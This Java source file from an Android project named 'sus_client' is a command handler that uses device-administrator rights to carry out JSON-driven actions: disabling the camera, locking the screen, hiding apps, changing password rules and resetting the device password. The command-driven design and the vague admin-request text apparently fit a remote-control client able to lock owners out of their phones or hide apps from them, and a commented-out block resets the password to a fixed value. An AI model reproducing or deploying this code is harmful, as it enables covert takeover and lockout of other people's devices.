package com.android.sus_client.commonutility;

import android.app.Activity;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

import com.android.sus_client.applaunchers.ActionActivity;
import com.android.sus_client.control.Const;
import com.android.sus_client.receivers.MyAdminReceiver;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.Serializable;

public class DeviceAdminPolicies {

    private ActionType actionType;
    private final Context mContext;
    private final ComponentName deviceAdminComponent;
    private final DevicePolicyManager devicePolicyManager;


    public DeviceAdminPolicies(Context context) {
        this(context, MyAdminReceiver.class);
    }

    public DeviceAdminPolicies(Context context, Class<? extends DeviceAdminReceiver> tClass) {
        actionType = null;
        mContext = context;
        deviceAdminComponent = new ComponentName(mContext, tClass);
        devicePolicyManager = (DevicePolicyManager) mContext.getSystemService(Context.DEVICE_POLICY_SERVICE);
    }

    public ComponentName getDeviceAdminComponent() {
        return deviceAdminComponent;
    }

    public boolean isAdminActive() {
        return devicePolicyManager.isAdminActive(deviceAdminComponent);
    }

    public boolean isAdminActiveAndRequestPermission() {
        boolean isActive = devicePolicyManager.isAdminActive(deviceAdminComponent);
        // Start activity only if need permission
        if (!isActive) {
            Bundle bundle = new Bundle();
            bundle.putSerializable("actionType", actionType);
            ActionActivity.start(mContext, ActionActivity.ACTION_ENABLE_DEVICE_ADMIN, bundle);
        }
        return isActive;
    }

    /**
     * Process Json data and perform action
     */
    public void processData(String action) {
        processDataInternal(new ActionType(action, "{}"));
    }

    public void processData(JSONObject request) {
        processDataInternal(new ActionType().fromJson(request));
    }

    public void processDataInternal(ActionType action) {
        actionType = action;
        if (actionType == null) return;
        JSONObject data = actionType.getDataAsJson();
        switch (actionType.type) {
            case "Camera":
                setCameraDisabled(data.optBoolean("disable", false));
                break;
            case "Keyguard":
                enableDisableKeyguardFeatures(data.optInt("flags", DevicePolicyManager.KEYGUARD_DISABLE_FEATURES_ALL));
                break;
            case "Lock":
                lockScreen();
                break;
            case "HideApp":
                setApplicationHidden(data.optString("packageName", ""), data.optBoolean("enable", true));
                break;
            case "requirePass":
                requirePassword(data.optInt("length"),
                        data.optBoolean("numeric", true),
                        data.optBoolean("letters", true),
                        data.optBoolean("specials", true));
                break;
            case "resetPass":
                resetPassword(data.optString("newPass"));
                break;
        }
    }

    /**
     * Policy: watch-login
     */
    private void setCameraDisabled(boolean disableCamera) {
        if (isAdminActiveAndRequestPermission()) {
            devicePolicyManager.setCameraDisabled(deviceAdminComponent, disableCamera);
        }
    }

    /**
     * Policy: disable-keyguard-features
     */
    private void enableDisableKeyguardFeatures(int flags) {
        if (isAdminActiveAndRequestPermission()) {
            devicePolicyManager.setKeyguardDisabledFeatures(deviceAdminComponent, flags);
        }
    }

    /**
     * Policy: force-lock
     */
    private void lockScreen() {
        if (isAdminActiveAndRequestPermission()) {
            devicePolicyManager.lockNow();
        }
    }

    /**
     * Policy: hide-app
     */
    private void setApplicationHidden(String packageName, boolean enable) {
        if (isAdminActiveAndRequestPermission()) {
            devicePolicyManager.setApplicationHidden(deviceAdminComponent, packageName, enable);
        }
    }

    /**
     * Policy: require-password
     */
    private void requirePassword(int length, boolean numeric, boolean letters, boolean specials) {
        if (isAdminActiveAndRequestPermission()) {
            devicePolicyManager.setPasswordQuality(deviceAdminComponent, DevicePolicyManager.PASSWORD_QUALITY_COMPLEX);
            devicePolicyManager.setPasswordMinimumLength(deviceAdminComponent, length);
            devicePolicyManager.setPasswordMinimumLetters(deviceAdminComponent, letters ? 1 : 0);
            devicePolicyManager.setPasswordMinimumNumeric(deviceAdminComponent, numeric ? 1 : 0);
            devicePolicyManager.setPasswordMinimumSymbols(deviceAdminComponent, specials ? 1 : 0);
            devicePolicyManager.setPasswordQuality(deviceAdminComponent, DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED);
        }
    }

    /**
     * Policy: reset-password
     */
    private void resetPassword(String newPassword) {
        if (isAdminActiveAndRequestPermission()) {
            if (newPassword.isEmpty()) return;
            devicePolicyManager.resetPassword(newPassword, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
        }
    }

    /**
     * extra admin polices that can be applied
     */
    private void setMaximumFailedPasswordsForWipe(int numFailures) {
        if (isAdminActiveAndRequestPermission()) {
            devicePolicyManager.setMaximumFailedPasswordsForWipe(deviceAdminComponent, numFailures);
        }
    }

    private void setAutoTimeRequired(boolean requireAutoTime) {
        if (isAdminActiveAndRequestPermission()) {
            devicePolicyManager.setAutoTimeRequired(deviceAdminComponent, requireAutoTime);
        }
    }

    /**
     * Helper methods
     */
    public static boolean isDeviceAdminActive(Context context, Class<? extends DeviceAdminReceiver> deviceAdminReceiver) {
        final DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        final ComponentName adminComponent = new ComponentName(context, deviceAdminReceiver);
        if (dpm.isAdminActive(adminComponent)) {
            // setting polices if device admin active
            /*DeviceAdminPolicies policies = new DeviceAdminPolicies(context, deviceAdminReceiver);
            policies.setCameraDisabled(false);
            policies.forceLock();
            policies.resetPassword("6545");
            policies.enableDisableKeyguardFeatures();*/
            return true;
        } else {
            return false;
        }
    }

    // Request device admin permission
    // Question: set DeviceAdminReceiver polices dynamically without xml android
    // Question: DevicePolicyManager.EXTRA_DEVICE_POLICIES extra to request device admin policies dynamically before api level 30
    public static void requestDeviceAdminPermission(Context context, ComponentName adminComponent) {
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "This app needs admin privileges to apply policies.");
        if (context instanceof Activity) {
            ((Activity) context).startActivityForResult(intent, Const.DEVICE_ADMIN_REQUEST_CODE);
        } else {
            context.startActivity(intent);
        }
    }


    public static class ActionType implements Serializable {

        public String type;
        public String data;

        public ActionType(String type, String data) {
            this.type = type;
            this.data = data;
        }

        public ActionType() {
            this.type = "";
            this.data = "{}";
        }

        public ActionType fromJson(JSONObject json) {
            try {
                type = json.optString("type", "");
                data = json.optString("data", "");
            } catch (Exception ignored) {
            }
            return this;
        }

        public JSONObject getDataAsJson() {
            try {
                return new JSONObject(data);
            } catch (JSONException ignored) {
                return new JSONObject();
            }
        }

    }

}